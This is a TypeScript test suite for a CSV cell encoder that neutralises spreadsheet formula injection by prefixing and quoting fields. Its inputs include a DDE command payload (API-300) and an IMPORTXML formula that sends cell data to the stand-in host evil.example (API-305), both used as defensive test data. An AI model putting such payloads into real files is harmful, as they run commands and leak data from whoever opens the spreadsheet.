/**
 * API-3xx — the complete CSV cell encoder.
 *
 * A10's threat model asked A09 for **one** function that prefixes and quotes, because the
 * dangerous case is the field that needs both. A field prefixed but not quoted breaks the
 * row; quoted but not prefixed executes in Excel. These tests pin the combination.
 */
import { describe, expect, it } from 'vitest';
import { neutraliseCsvField } from '@verify/security';
import { csvCell, csvDocument, csvRow } from '@app/privacy/csv';

describe('csvCell', () => {
  it('API-300 a leading = is neutralised', () => {
    expect(csvCell("=cmd|'/c calc'!A0")).toBe("'=cmd|'/c calc'!A0");
  });

  it('API-301 a leading + is neutralised', () => {
    expect(csvCell('+1')).toBe("'+1");
  });

  it('API-302 a leading - is neutralised', () => {
    expect(csvCell('-1')).toBe("'-1");
  });

  it('API-303 a leading @ is neutralised', () => {
    expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  });

  it('API-304 a leading tab is neutralised', () => {
    expect(csvCell('\t=1+1')).toBe("'\t=1+1");
  });

  it('API-305 a field with a formula leader, a quote AND a comma is prefixed inside the quotes', () => {
    // The case that catches prefix-without-quoting, and quote-without-prefixing.
    const hostile = '=IMPORTXML("https://evil.example/?d="&A1,"//x")';
    const encoded = csvCell(hostile);

    // The apostrophe is inside the opening quote, where a spreadsheet honours it.
    expect(encoded.startsWith(`"'=`)).toBe(true);
    expect(encoded.endsWith('"')).toBe(true);
    expect(encoded).toBe(`"'=IMPORTXML(""https://evil.example/?d=""&A1,""//x"")"`);

    // The row still has exactly two fields despite the embedded comma.
    expect(csvRow([hostile, 'after'])).toBe(`${encoded},after`);
  });

  it('API-306 a quote and a comma together, with no formula leader, is quoted and doubled', () => {
    expect(csvCell('he said "hello", loudly')).toBe('"he said ""hello"", loudly"');
  });

  it('API-307 null and undefined become an empty field, never the word null', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
    expect(csvRow([null, undefined, ''])).toBe(',,');
  });

  it('API-308 an embedded newline is quoted rather than breaking the row', () => {
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
  });

  it('API-309 rows and documents use CRLF, as RFC4180 specifies', () => {
    expect(
      csvDocument([
        ['a', 'b'],
        ['c', 'd'],
      ]),
    ).toBe('a,b\r\nc,d\r\n');
    expect(csvDocument([])).toBe('');
  });

  it("API-310 the prefix step is A02's, so the two agree on what starts a formula", () => {
    for (const value of ['=x', '+x', '-x', '@x', '\tx', '\rx']) {
      const prefixed = neutraliseCsvField(value);
      expect(prefixed.startsWith("'"), value).toBe(true);
      expect(csvCell(value).includes(prefixed), value).toBe(true);
    }
    // And anything A02 leaves alone, this encoder does not prefix either.
    expect(neutraliseCsvField('plain')).toBe('plain');
    expect(csvCell('plain')).toBe('plain');
  });

  it('API-311 a negative number is still neutralised, and a plain number is not mangled', () => {
    expect(csvCell(42)).toBe('42');
    expect(csvCell(-42)).toBe("'-42");
    expect(csvCell(true)).toBe('true');
  });
});
